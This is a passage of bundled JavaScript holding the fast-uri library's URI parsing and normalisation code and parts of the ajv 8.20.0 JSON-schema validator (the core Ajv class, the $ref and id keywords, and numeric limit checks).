          if (normalizedRegion.slice(0, 2) !== "//") {
            parsed.error = parsed.error || "URI authority must not contain a literal backslash.";
            malformedAuthorityOrPort = true;
          } else if (region.length !== normalizedRegion.length) {
            parsed.error = parsed.error || "URI authority introducer must not contain whitespace.";
            malformedAuthorityOrPort = true;
          }
        }
      }
      const matches = uri.match(URI_PARSE);
      if (matches) {
        parsed.scheme = matches[1];
        parsed.userinfo = matches[3];
        parsed.host = matches[4];
        parsed.port = parseInt(matches[5], 10);
        parsed.path = matches[6] || "";
        parsed.query = matches[7];
        parsed.fragment = matches[8];
        if (isNaN(parsed.port)) {
          parsed.port = matches[5];
        }
        const parseError = getParseError(parsed, matches);
        if (parseError !== void 0) {
          parsed.error = parsed.error || parseError;
          malformedAuthorityOrPort = true;
        }
        if (parsed.host) {
          const ipv4result = isIPv4(parsed.host);
          if (ipv4result === false) {
            const ipv6result = normalizeIPv6(parsed.host);
            parsed.host = ipv6result.host.toLowerCase();
            isIP = ipv6result.isIPV6;
          } else {
            isIP = true;
          }
        }
        if (parsed.scheme === void 0 && parsed.userinfo === void 0 && parsed.host === void 0 && parsed.port === void 0 && parsed.query === void 0 && !parsed.path) {
          parsed.reference = "same-document";
        } else if (parsed.scheme === void 0) {
          parsed.reference = "relative";
        } else if (parsed.fragment === void 0) {
          parsed.reference = "absolute";
        } else {
          parsed.reference = "uri";
        }
        if (options.reference && options.reference !== "suffix" && options.reference !== parsed.reference) {
          parsed.error = parsed.error || "URI is not a " + options.reference + " reference.";
        }
        const schemeHandler = getSchemeHandler(options.scheme || parsed.scheme);
        if (!options.unicodeSupport && (!schemeHandler || !schemeHandler.unicodeSupport)) {
          if (parsed.host && (options.domainHost || schemeHandler && schemeHandler.domainHost) && isIP === false && nonSimpleDomain(parsed.host)) {
            try {
              parsed.host = new URL("http://" + parsed.host).hostname;
            } catch (e) {
              parsed.error = parsed.error || "Host's domain name can not be converted to ASCII: " + e;
            }
          }
        }
        if (!schemeHandler || schemeHandler && !schemeHandler.skipNormalize) {
          if (uri.indexOf("%") !== -1) {
            if (parsed.scheme !== void 0) {
              parsed.scheme = unescape(parsed.scheme);
            }
            if (parsed.host !== void 0) {
              parsed.host = reescapeHostDelimiters(unescape(parsed.host), isIP);
            }
          }
          if (parsed.path) {
            parsed.path = normalizePathEncoding(parsed.path);
          }
          if (parsed.fragment) {
            try {
              parsed.fragment = encodeURI(decodeURIComponent(parsed.fragment));
            } catch {
              parsed.error = parsed.error || "URI malformed";
            }
          }
        }
        if (schemeHandler && schemeHandler.parse) {
          schemeHandler.parse(parsed, options);
        }
      } else {
        parsed.error = parsed.error || "URI can not be parsed.";
      }
      return { parsed, malformedAuthorityOrPort };
    }
    function parse3(uri, opts) {
      return parseWithStatus(uri, opts).parsed;
    }
    function normalizeString(uri, opts) {
      return normalizeStringWithStatus(uri, opts).normalized;
    }
    function normalizeStringWithStatus(uri, opts) {
      const { parsed, malformedAuthorityOrPort } = parseWithStatus(uri, opts);
      return {
        normalized: malformedAuthorityOrPort ? uri : serialize(parsed, opts),
        malformedAuthorityOrPort
      };
    }
    function normalizeComparableURI(uri, opts) {
      if (typeof uri === "string") {
        const { normalized, malformedAuthorityOrPort } = normalizeStringWithStatus(uri, opts);
        return malformedAuthorityOrPort ? void 0 : normalized;
      }
      if (typeof uri === "object") {
        return serialize(uri, opts);
      }
    }
    var fastUri = {
      SCHEMES,
      normalize: normalize2,
      resolve: resolve2,
      resolveComponent,
      equal,
      serialize,
      parse: parse3
    };
    module2.exports = fastUri;
    module2.exports.default = fastUri;
    module2.exports.fastUri = fastUri;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/uri.js
var require_uri = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/uri.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var uri = require_fast_uri();
    uri.code = 'require("ajv/dist/runtime/uri").default';
    exports2.default = uri;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/core.js
var require_core = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/core.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.CodeGen = exports2.Name = exports2.nil = exports2.stringify = exports2.str = exports2._ = exports2.KeywordCxt = void 0;
    var validate_1 = require_validate();
    Object.defineProperty(exports2, "KeywordCxt", { enumerable: true, get: function() {
      return validate_1.KeywordCxt;
    } });
    var codegen_1 = require_codegen();
    Object.defineProperty(exports2, "_", { enumerable: true, get: function() {
      return codegen_1._;
    } });
    Object.defineProperty(exports2, "str", { enumerable: true, get: function() {
      return codegen_1.str;
    } });
    Object.defineProperty(exports2, "stringify", { enumerable: true, get: function() {
      return codegen_1.stringify;
    } });
    Object.defineProperty(exports2, "nil", { enumerable: true, get: function() {
      return codegen_1.nil;
    } });
    Object.defineProperty(exports2, "Name", { enumerable: true, get: function() {
      return codegen_1.Name;
    } });
    Object.defineProperty(exports2, "CodeGen", { enumerable: true, get: function() {
      return codegen_1.CodeGen;
    } });
    var validation_error_1 = require_validation_error();
    var ref_error_1 = require_ref_error();
    var rules_1 = require_rules();
    var compile_1 = require_compile();
    var codegen_2 = require_codegen();
    var resolve_1 = require_resolve();
    var dataType_1 = require_dataType();
    var util_1 = require_util();
    var $dataRefSchema = require_data();
    var uri_1 = require_uri();
    var defaultRegExp = (str, flags) => new RegExp(str, flags);
    defaultRegExp.code = "new RegExp";
    var META_IGNORE_OPTIONS = ["removeAdditional", "useDefaults", "coerceTypes"];
    var EXT_SCOPE_NAMES = /* @__PURE__ */ new Set([
      "validate",
      "serialize",
      "parse",
      "wrapper",
      "root",
      "schema",
      "keyword",
      "pattern",
      "formats",
      "validate$data",
      "func",
      "obj",
      "Error"
    ]);
    var removedOptions = {
      errorDataPath: "",
      format: "`validateFormats: false` can be used instead.",
      nullable: '"nullable" keyword is supported by default.',
      jsonPointers: "Deprecated jsPropertySyntax can be used instead.",
      extendRefs: "Deprecated ignoreKeywordsWithRef can be used instead.",
      missingRefs: "Pass empty schema with $id that should be ignored to ajv.addSchema.",
      processCode: "Use option `code: {process: (code, schemaEnv: object) => string}`",
      sourceCode: "Use option `code: {source: true}`",
      strictDefaults: "It is default now, see option `strict`.",
      strictKeywords: "It is default now, see option `strict`.",
      uniqueItems: '"uniqueItems" keyword is always validated.',
      unknownFormats: "Disable strict mode or pass `true` to `ajv.addFormat` (or `formats` option).",
      cache: "Map is used as cache, schema object as key.",
      serialize: "Map is used as cache, schema object as key.",
      ajvErrors: "It is default now."
    };
    var deprecatedOptions = {
      ignoreKeywordsWithRef: "",
      jsPropertySyntax: "",
      unicode: '"minLength"/"maxLength" account for unicode characters by default.'
    };
    var MAX_EXPRESSION = 200;
    function requiredOptions(o) {
      var _a, _b, _c, _d, _e, _f, _g, _h, _j, _k, _l, _m, _o, _p, _q, _r, _s, _t, _u, _v, _w, _x, _y, _z, _0;
      const s = o.strict;
      const _optz = (_a = o.code) === null || _a === void 0 ? void 0 : _a.optimize;
      const optimize = _optz === true || _optz === void 0 ? 1 : _optz || 0;
      const regExp = (_c = (_b = o.code) === null || _b === void 0 ? void 0 : _b.regExp) !== null && _c !== void 0 ? _c : defaultRegExp;
      const uriResolver = (_d = o.uriResolver) !== null && _d !== void 0 ? _d : uri_1.default;
      return {
        strictSchema: (_f = (_e = o.strictSchema) !== null && _e !== void 0 ? _e : s) !== null && _f !== void 0 ? _f : true,
        strictNumbers: (_h = (_g = o.strictNumbers) !== null && _g !== void 0 ? _g : s) !== null && _h !== void 0 ? _h : true,
        strictTypes: (_k = (_j = o.strictTypes) !== null && _j !== void 0 ? _j : s) !== null && _k !== void 0 ? _k : "log",
        strictTuples: (_m = (_l = o.strictTuples) !== null && _l !== void 0 ? _l : s) !== null && _m !== void 0 ? _m : "log",
        strictRequired: (_p = (_o = o.strictRequired) !== null && _o !== void 0 ? _o : s) !== null && _p !== void 0 ? _p : false,
        code: o.code ? { ...o.code, optimize, regExp } : { optimize, regExp },
        loopRequired: (_q = o.loopRequired) !== null && _q !== void 0 ? _q : MAX_EXPRESSION,
        loopEnum: (_r = o.loopEnum) !== null && _r !== void 0 ? _r : MAX_EXPRESSION,
        meta: (_s = o.meta) !== null && _s !== void 0 ? _s : true,
        messages: (_t = o.messages) !== null && _t !== void 0 ? _t : true,
        inlineRefs: (_u = o.inlineRefs) !== null && _u !== void 0 ? _u : true,
        schemaId: (_v = o.schemaId) !== null && _v !== void 0 ? _v : "$id",
        addUsedSchema: (_w = o.addUsedSchema) !== null && _w !== void 0 ? _w : true,
        validateSchema: (_x = o.validateSchema) !== null && _x !== void 0 ? _x : true,
        validateFormats: (_y = o.validateFormats) !== null && _y !== void 0 ? _y : true,
        unicodeRegExp: (_z = o.unicodeRegExp) !== null && _z !== void 0 ? _z : true,
        int32range: (_0 = o.int32range) !== null && _0 !== void 0 ? _0 : true,
        uriResolver
      };
    }
    var Ajv = class {
      constructor(opts = {}) {
        this.schemas = {};
        this.refs = {};
        this.formats = /* @__PURE__ */ Object.create(null);
        this._compilations = /* @__PURE__ */ new Set();
        this._loading = {};
        this._cache = /* @__PURE__ */ new Map();
        opts = this.opts = { ...opts, ...requiredOptions(opts) };
        const { es5, lines } = this.opts.code;
        this.scope = new codegen_2.ValueScope({ scope: {}, prefixes: EXT_SCOPE_NAMES, es5, lines });
        this.logger = getLogger(opts.logger);
        const formatOpt = opts.validateFormats;
        opts.validateFormats = false;
        this.RULES = (0, rules_1.getRules)();
        checkOptions.call(this, removedOptions, opts, "NOT SUPPORTED");
        checkOptions.call(this, deprecatedOptions, opts, "DEPRECATED", "warn");
        this._metaOpts = getMetaSchemaOptions.call(this);
        if (opts.formats)
          addInitialFormats.call(this);
        this._addVocabularies();
        this._addDefaultMetaSchema();
        if (opts.keywords)
          addInitialKeywords.call(this, opts.keywords);
        if (typeof opts.meta == "object")
          this.addMetaSchema(opts.meta);
        addInitialSchemas.call(this);
        opts.validateFormats = formatOpt;
      }
      _addVocabularies() {
        this.addKeyword("$async");
      }
      _addDefaultMetaSchema() {
        const { $data, meta, schemaId } = this.opts;
        let _dataRefSchema = $dataRefSchema;
        if (schemaId === "id") {
          _dataRefSchema = { ...$dataRefSchema };
          _dataRefSchema.id = _dataRefSchema.$id;
          delete _dataRefSchema.$id;
        }
        if (meta && $data)
          this.addMetaSchema(_dataRefSchema, _dataRefSchema[schemaId], false);
      }
      defaultMeta() {
        const { meta, schemaId } = this.opts;
        return this.opts.defaultMeta = typeof meta == "object" ? meta[schemaId] || meta : void 0;
      }
      validate(schemaKeyRef, data) {
        let v;
        if (typeof schemaKeyRef == "string") {
          v = this.getSchema(schemaKeyRef);
          if (!v)
            throw new Error(`no schema with key or ref "${schemaKeyRef}"`);
        } else {
          v = this.compile(schemaKeyRef);
        }
        const valid5 = v(data);
        if (!("$async" in v))
          this.errors = v.errors;
        return valid5;
      }
      compile(schema, _meta) {
        const sch = this._addSchema(schema, _meta);
        return sch.validate || this._compileSchemaEnv(sch);
      }
      compileAsync(schema, meta) {
        if (typeof this.opts.loadSchema != "function") {
          throw new Error("options.loadSchema should be a function");
        }
        const { loadSchema } = this.opts;
        return runCompileAsync.call(this, schema, meta);
        async function runCompileAsync(_schema, _meta) {
          await loadMetaSchema.call(this, _schema.$schema);
          const sch = this._addSchema(_schema, _meta);
          return sch.validate || _compileAsync.call(this, sch);
        }
        async function loadMetaSchema($ref) {
          if ($ref && !this.getSchema($ref)) {
            await runCompileAsync.call(this, { $ref }, true);
          }
        }
        async function _compileAsync(sch) {
          try {
            return this._compileSchemaEnv(sch);
          } catch (e) {
            if (!(e instanceof ref_error_1.default))
              throw e;
            checkLoaded.call(this, e);
            await loadMissingSchema.call(this, e.missingSchema);
            return _compileAsync.call(this, sch);
          }
        }
        function checkLoaded({ missingSchema: ref, missingRef }) {
          if (this.refs[ref]) {
            throw new Error(`AnySchema ${ref} is loaded but ${missingRef} cannot be resolved`);
          }
        }
        async function loadMissingSchema(ref) {
          const _schema = await _loadSchema.call(this, ref);
          if (!this.refs[ref])
            await loadMetaSchema.call(this, _schema.$schema);
          if (!this.refs[ref])
            this.addSchema(_schema, ref, meta);
        }
        async function _loadSchema(ref) {
          const p = this._loading[ref];
          if (p)
            return p;
          try {
            return await (this._loading[ref] = loadSchema(ref));
          } finally {
            delete this._loading[ref];
          }
        }
      }
      // Adds schema to the instance
      addSchema(schema, key, _meta, _validateSchema = this.opts.validateSchema) {
        if (Array.isArray(schema)) {
          for (const sch of schema)
            this.addSchema(sch, void 0, _meta, _validateSchema);
          return this;
        }
        let id;
        if (typeof schema === "object") {
          const { schemaId } = this.opts;
          id = schema[schemaId];
          if (id !== void 0 && typeof id != "string") {
            throw new Error(`schema ${schemaId} must be string`);
          }
        }
        key = (0, resolve_1.normalizeId)(key || id);
        this._checkUnique(key);
        this.schemas[key] = this._addSchema(schema, _meta, key, _validateSchema, true);
        return this;
      }
      // Add schema that will be used to validate other schemas
      // options in META_IGNORE_OPTIONS are alway set to false
      addMetaSchema(schema, key, _validateSchema = this.opts.validateSchema) {
        this.addSchema(schema, key, true, _validateSchema);
        return this;
      }
      //  Validate schema against its meta-schema
      validateSchema(schema, throwOrLogError) {
        if (typeof schema == "boolean")
          return true;
        let $schema;
        $schema = schema.$schema;
        if ($schema !== void 0 && typeof $schema != "string") {
          throw new Error("$schema must be a string");
        }
        $schema = $schema || this.opts.defaultMeta || this.defaultMeta();
        if (!$schema) {
          this.logger.warn("meta-schema not available");
          this.errors = null;
          return true;
        }
        const valid5 = this.validate($schema, schema);
        if (!valid5 && throwOrLogError) {
          const message = "schema is invalid: " + this.errorsText();
          if (this.opts.validateSchema === "log")
            this.logger.error(message);
          else
            throw new Error(message);
        }
        return valid5;
      }
      // Get compiled schema by `key` or `ref`.
      // (`key` that was passed to `addSchema` or full schema reference - `schema.$id` or resolved id)
      getSchema(keyRef) {
        let sch;
        while (typeof (sch = getSchEnv.call(this, keyRef)) == "string")
          keyRef = sch;
        if (sch === void 0) {
          const { schemaId } = this.opts;
          const root = new compile_1.SchemaEnv({ schema: {}, schemaId });
          sch = compile_1.resolveSchema.call(this, root, keyRef);
          if (!sch)
            return;
          this.refs[keyRef] = sch;
        }
        return sch.validate || this._compileSchemaEnv(sch);
      }
      // Remove cached schema(s).
      // If no parameter is passed all schemas but meta-schemas are removed.
      // If RegExp is passed all schemas with key/id matching pattern but meta-schemas are removed.
      // Even if schema is referenced by other schemas it still can be removed as other schemas have local references.
      removeSchema(schemaKeyRef) {
        if (schemaKeyRef instanceof RegExp) {
          this._removeAllSchemas(this.schemas, schemaKeyRef);
          this._removeAllSchemas(this.refs, schemaKeyRef);
          return this;
        }
        switch (typeof schemaKeyRef) {
          case "undefined":
            this._removeAllSchemas(this.schemas);
            this._removeAllSchemas(this.refs);
            this._cache.clear();
            return this;
          case "string": {
            const sch = getSchEnv.call(this, schemaKeyRef);
            if (typeof sch == "object")
              this._cache.delete(sch.schema);
            delete this.schemas[schemaKeyRef];
            delete this.refs[schemaKeyRef];
            return this;
          }
          case "object": {
            const cacheKey = schemaKeyRef;
            this._cache.delete(cacheKey);
            let id = schemaKeyRef[this.opts.schemaId];
            if (id) {
              id = (0, resolve_1.normalizeId)(id);
              delete this.schemas[id];
              delete this.refs[id];
            }
            return this;
          }
          default:
            throw new Error("ajv.removeSchema: invalid parameter");
        }
      }
      // add "vocabulary" - a collection of keywords
      addVocabulary(definitions) {
        for (const def of definitions)
          this.addKeyword(def);
        return this;
      }
      addKeyword(kwdOrDef, def) {
        let keyword;
        if (typeof kwdOrDef == "string") {
          keyword = kwdOrDef;
          if (typeof def == "object") {
            this.logger.warn("these parameters are deprecated, see docs for addKeyword");
            def.keyword = keyword;
          }
        } else if (typeof kwdOrDef == "object" && def === void 0) {
          def = kwdOrDef;
          keyword = def.keyword;
          if (Array.isArray(keyword) && !keyword.length) {
            throw new Error("addKeywords: keyword must be string or non-empty array");
          }
        } else {
          throw new Error("invalid addKeywords parameters");
        }
        checkKeyword.call(this, keyword, def);
        if (!def) {
          (0, util_1.eachItem)(keyword, (kwd) => addRule.call(this, kwd));
          return this;
        }
        keywordMetaschema.call(this, def);
        const definition = {
          ...def,
          type: (0, dataType_1.getJSONTypes)(def.type),
          schemaType: (0, dataType_1.getJSONTypes)(def.schemaType)
        };
        (0, util_1.eachItem)(keyword, definition.type.length === 0 ? (k) => addRule.call(this, k, definition) : (k) => definition.type.forEach((t) => addRule.call(this, k, definition, t)));
        return this;
      }
      getKeyword(keyword) {
        const rule = this.RULES.all[keyword];
        return typeof rule == "object" ? rule.definition : !!rule;
      }
      // Remove keyword
      removeKeyword(keyword) {
        const { RULES } = this;
        delete RULES.keywords[keyword];
        delete RULES.all[keyword];
        for (const group of RULES.rules) {
          const i = group.rules.findIndex((rule) => rule.keyword === keyword);
          if (i >= 0)
            group.rules.splice(i, 1);
        }
        return this;
      }
      // Add format
      addFormat(name, format) {
        if (typeof format == "string")
          format = new RegExp(format);
        this.formats[name] = format;
        return this;
      }
      errorsText(errors = this.errors, { separator = ", ", dataVar = "data" } = {}) {
        if (!errors || errors.length === 0)
          return "No errors";
        return errors.map((e) => `${dataVar}${e.instancePath} ${e.message}`).reduce((text, msg) => text + separator + msg);
      }
      $dataMetaSchema(metaSchema, keywordsJsonPointers) {
        const rules = this.RULES.all;
        metaSchema = JSON.parse(JSON.stringify(metaSchema));
        for (const jsonPointer of keywordsJsonPointers) {
          const segments = jsonPointer.split("/").slice(1);
          let keywords = metaSchema;
          for (const seg of segments)
            keywords = keywords[seg];
          for (const key in rules) {
            const rule = rules[key];
            if (typeof rule != "object")
              continue;
            const { $data } = rule.definition;
            const schema = keywords[key];
            if ($data && schema)
              keywords[key] = schemaOrData(schema);
          }
        }
        return metaSchema;
      }
      _removeAllSchemas(schemas, regex) {
        for (const keyRef in schemas) {
          const sch = schemas[keyRef];
          if (!regex || regex.test(keyRef)) {
            if (typeof sch == "string") {
              delete schemas[keyRef];
            } else if (sch && !sch.meta) {
              this._cache.delete(sch.schema);
              delete schemas[keyRef];
            }
          }
        }
      }
      _addSchema(schema, meta, baseId, validateSchema = this.opts.validateSchema, addSchema = this.opts.addUsedSchema) {
        let id;
        const { schemaId } = this.opts;
        if (typeof schema == "object") {
          id = schema[schemaId];
        } else {
          if (this.opts.jtd)
            throw new Error("schema must be object");
          else if (typeof schema != "boolean")
            throw new Error("schema must be object or boolean");
        }
        let sch = this._cache.get(schema);
        if (sch !== void 0)
          return sch;
        baseId = (0, resolve_1.normalizeId)(id || baseId);
        const localRefs = resolve_1.getSchemaRefs.call(this, schema, baseId);
        sch = new compile_1.SchemaEnv({ schema, schemaId, meta, baseId, localRefs });
        this._cache.set(sch.schema, sch);
        if (addSchema && !baseId.startsWith("#")) {
          if (baseId)
            this._checkUnique(baseId);
          this.refs[baseId] = sch;
        }
        if (validateSchema)
          this.validateSchema(schema, true);
        return sch;
      }
      _checkUnique(id) {
        if (this.schemas[id] || this.refs[id]) {
          throw new Error(`schema with key or id "${id}" already exists`);
        }
      }
      _compileSchemaEnv(sch) {
        if (sch.meta)
          this._compileMetaSchema(sch);
        else
          compile_1.compileSchema.call(this, sch);
        if (!sch.validate)
          throw new Error("ajv implementation error");
        return sch.validate;
      }
      _compileMetaSchema(sch) {
        const currentOpts = this.opts;
        this.opts = this._metaOpts;
        try {
          compile_1.compileSchema.call(this, sch);
        } finally {
          this.opts = currentOpts;
        }
      }
    };
    Ajv.ValidationError = validation_error_1.default;
    Ajv.MissingRefError = ref_error_1.default;
    exports2.default = Ajv;
    function checkOptions(checkOpts, options, msg, log2 = "error") {
      for (const key in checkOpts) {
        const opt = key;
        if (opt in options)
          this.logger[log2](`${msg}: option ${key}. ${checkOpts[opt]}`);
      }
    }
    function getSchEnv(keyRef) {
      keyRef = (0, resolve_1.normalizeId)(keyRef);
      return this.schemas[keyRef] || this.refs[keyRef];
    }
    function addInitialSchemas() {
      const optsSchemas = this.opts.schemas;
      if (!optsSchemas)
        return;
      if (Array.isArray(optsSchemas))
        this.addSchema(optsSchemas);
      else
        for (const key in optsSchemas)
          this.addSchema(optsSchemas[key], key);
    }
    function addInitialFormats() {
      for (const name in this.opts.formats) {
        const format = this.opts.formats[name];
        if (format)
          this.addFormat(name, format);
      }
    }
    function addInitialKeywords(defs) {
      if (Array.isArray(defs)) {
        this.addVocabulary(defs);
        return;
      }
      this.logger.warn("keywords option as map is deprecated, pass array");
      for (const keyword in defs) {
        const def = defs[keyword];
        if (!def.keyword)
          def.keyword = keyword;
        this.addKeyword(def);
      }
    }
    function getMetaSchemaOptions() {
      const metaOpts = { ...this.opts };
      for (const opt of META_IGNORE_OPTIONS)
        delete metaOpts[opt];
      return metaOpts;
    }
    var noLogs = { log() {
    }, warn() {
    }, error() {
    } };
    function getLogger(logger2) {
      if (logger2 === false)
        return noLogs;
      if (logger2 === void 0)
        return console;
      if (logger2.log && logger2.warn && logger2.error)
        return logger2;
      throw new Error("logger must implement log, warn and error methods");
    }
    var KEYWORD_NAME = /^[a-z_$][a-z0-9_$:-]*$/i;
    function checkKeyword(keyword, def) {
      const { RULES } = this;
      (0, util_1.eachItem)(keyword, (kwd) => {
        if (RULES.keywords[kwd])
          throw new Error(`Keyword ${kwd} is already defined`);
        if (!KEYWORD_NAME.test(kwd))
          throw new Error(`Keyword ${kwd} has invalid name`);
      });
      if (!def)
        return;
      if (def.$data && !("code" in def || "validate" in def)) {
        throw new Error('$data keyword must have "code" or "validate" function');
      }
    }
    function addRule(keyword, definition, dataType) {
      var _a;
      const post = definition === null || definition === void 0 ? void 0 : definition.post;
      if (dataType && post)
        throw new Error('keyword with "post" flag cannot have "type"');
      const { RULES } = this;
      let ruleGroup = post ? RULES.post : RULES.rules.find(({ type: t }) => t === dataType);
      if (!ruleGroup) {
        ruleGroup = { type: dataType, rules: [] };
        RULES.rules.push(ruleGroup);
      }
      RULES.keywords[keyword] = true;
      if (!definition)
        return;
      const rule = {
        keyword,
        definition: {
          ...definition,
          type: (0, dataType_1.getJSONTypes)(definition.type),
          schemaType: (0, dataType_1.getJSONTypes)(definition.schemaType)
        }
      };
      if (definition.before)
        addBeforeRule.call(this, ruleGroup, rule, definition.before);
      else
        ruleGroup.rules.push(rule);
      RULES.all[keyword] = rule;
      (_a = definition.implements) === null || _a === void 0 ? void 0 : _a.forEach((kwd) => this.addKeyword(kwd));
    }
    function addBeforeRule(ruleGroup, rule, before) {
      const i = ruleGroup.rules.findIndex((_rule) => _rule.keyword === before);
      if (i >= 0) {
        ruleGroup.rules.splice(i, 0, rule);
      } else {
        ruleGroup.rules.push(rule);
        this.logger.warn(`rule ${before} is not defined`);
      }
    }
    function keywordMetaschema(def) {
      let { metaSchema } = def;
      if (metaSchema === void 0)
        return;
      if (def.$data && this.opts.$data)
        metaSchema = schemaOrData(metaSchema);
      def.validateSchema = this.compile(metaSchema, true);
    }
    var $dataRef = {
      $ref: "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"
    };
    function schemaOrData(schema) {
      return { anyOf: [schema, $dataRef] };
    }
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/core/id.js
var require_id = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/core/id.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var def = {
      keyword: "id",
      code() {
        throw new Error('NOT SUPPORTED: keyword "id", use "$id" for schema ID');
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/core/ref.js
var require_ref = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/core/ref.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.callRef = exports2.getValidate = void 0;
    var ref_error_1 = require_ref_error();
    var code_1 = require_code2();
    var codegen_1 = require_codegen();
    var names_1 = require_names();
    var compile_1 = require_compile();
    var util_1 = require_util();
    var def = {
      keyword: "$ref",
      schemaType: "string",
      code(cxt) {
        const { gen, schema: $ref, it } = cxt;
        const { baseId, schemaEnv: env, validateName, opts, self } = it;
        const { root } = env;
        if (($ref === "#" || $ref === "#/") && baseId === root.baseId)
          return callRootRef();
        const schOrEnv = compile_1.resolveRef.call(self, root, baseId, $ref);
        if (schOrEnv === void 0)
          throw new ref_error_1.default(it.opts.uriResolver, baseId, $ref);
        if (schOrEnv instanceof compile_1.SchemaEnv)
          return callValidate(schOrEnv);
        return inlineRefSchema(schOrEnv);
        function callRootRef() {
          if (env === root)
            return callRef(cxt, validateName, env, env.$async);
          const rootName = gen.scopeValue("root", { ref: root });
          return callRef(cxt, (0, codegen_1._)`${rootName}.validate`, root, root.$async);
        }
        function callValidate(sch) {
          const v = getValidate(cxt, sch);
          callRef(cxt, v, sch, sch.$async);
        }
        function inlineRefSchema(sch) {
          const schName = gen.scopeValue("schema", opts.code.source === true ? { ref: sch, code: (0, codegen_1.stringify)(sch) } : { ref: sch });
          const valid5 = gen.name("valid");
          const schCxt = cxt.subschema({
            schema: sch,
            dataTypes: [],
            schemaPath: codegen_1.nil,
            topSchemaRef: schName,
            errSchemaPath: $ref
          }, valid5);
          cxt.mergeEvaluated(schCxt);
          cxt.ok(valid5);
        }
      }
    };
    function getValidate(cxt, sch) {
      const { gen } = cxt;
      return sch.validate ? gen.scopeValue("validate", { ref: sch.validate }) : (0, codegen_1._)`${gen.scopeValue("wrapper", { ref: sch })}.validate`;
    }
    exports2.getValidate = getValidate;
    function callRef(cxt, v, sch, $async) {
      const { gen, it } = cxt;
      const { allErrors, schemaEnv: env, opts } = it;
      const passCxt = opts.passContext ? names_1.default.this : codegen_1.nil;
      if ($async)
        callAsyncRef();
      else
        callSyncRef();
      function callAsyncRef() {
        if (!env.$async)
          throw new Error("async schema referenced by sync schema");
        const valid5 = gen.let("valid");
        gen.try(() => {
          gen.code((0, codegen_1._)`await ${(0, code_1.callValidateCode)(cxt, v, passCxt)}`);
          addEvaluatedFrom(v);
          if (!allErrors)
            gen.assign(valid5, true);
        }, (e) => {
          gen.if((0, codegen_1._)`!(${e} instanceof ${it.ValidationError})`, () => gen.throw(e));
          addErrorsFrom(e);
          if (!allErrors)
            gen.assign(valid5, false);
        });
        cxt.ok(valid5);
      }
      function callSyncRef() {
        cxt.result((0, code_1.callValidateCode)(cxt, v, passCxt), () => addEvaluatedFrom(v), () => addErrorsFrom(v));
      }
      function addErrorsFrom(source) {
        const errs = (0, codegen_1._)`${source}.errors`;
        gen.assign(names_1.default.vErrors, (0, codegen_1._)`${names_1.default.vErrors} === null ? ${errs} : ${names_1.default.vErrors}.concat(${errs})`);
        gen.assign(names_1.default.errors, (0, codegen_1._)`${names_1.default.vErrors}.length`);
      }
      function addEvaluatedFrom(source) {
        var _a;
        if (!it.opts.unevaluated)
          return;
        const schEvaluated = (_a = sch === null || sch === void 0 ? void 0 : sch.validate) === null || _a === void 0 ? void 0 : _a.evaluated;
        if (it.props !== true) {
          if (schEvaluated && !schEvaluated.dynamicProps) {
            if (schEvaluated.props !== void 0) {
              it.props = util_1.mergeEvaluated.props(gen, schEvaluated.props, it.props);
            }
          } else {
            const props = gen.var("props", (0, codegen_1._)`${source}.evaluated.props`);
            it.props = util_1.mergeEvaluated.props(gen, props, it.props, codegen_1.Name);
          }
        }
        if (it.items !== true) {
          if (schEvaluated && !schEvaluated.dynamicItems) {
            if (schEvaluated.items !== void 0) {
              it.items = util_1.mergeEvaluated.items(gen, schEvaluated.items, it.items);
            }
          } else {
            const items = gen.var("items", (0, codegen_1._)`${source}.evaluated.items`);
            it.items = util_1.mergeEvaluated.items(gen, items, it.items, codegen_1.Name);
          }
        }
      }
    }
    exports2.callRef = callRef;
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/core/index.js
var require_core2 = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/core/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var id_1 = require_id();
    var ref_1 = require_ref();
    var core = [
      "$schema",
      "$id",
      "$defs",
      "$vocabulary",
      { keyword: "$comment" },
      "definitions",
      id_1.default,
      ref_1.default
    ];
    exports2.default = core;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitNumber.js
var require_limitNumber = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitNumber.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var ops = codegen_1.operators;
    var KWDs = {
      maximum: { okStr: "<=", ok: ops.LTE, fail: ops.GT },
      minimum: { okStr: ">=", ok: ops.GTE, fail: ops.LT },
      exclusiveMaximum: { okStr: "<", ok: ops.LT, fail: ops.GTE },
      exclusiveMinimum: { okStr: ">", ok: ops.GT, fail: ops.LTE }
    };
    var error = {
      message: ({ keyword, schemaCode }) => (0, codegen_1.str)`must be ${KWDs[keyword].okStr} ${schemaCode}`,
      params: ({ keyword, schemaCode }) => (0, codegen_1._)`{comparison: ${KWDs[keyword].okStr}, limit: ${schemaCode}}`
    };
    var def = {
      keyword: Object.keys(KWDs),
      type: "number",
      schemaType: "number",
      $data: true,
      error,
      code(cxt) {
        const { keyword, data, schemaCode } = cxt;
        cxt.fail$data((0, codegen_1._)`${data} ${KWDs[keyword].fail} ${schemaCode} || isNaN(${data})`);
      }
    };
    exports2.default = def;
  }
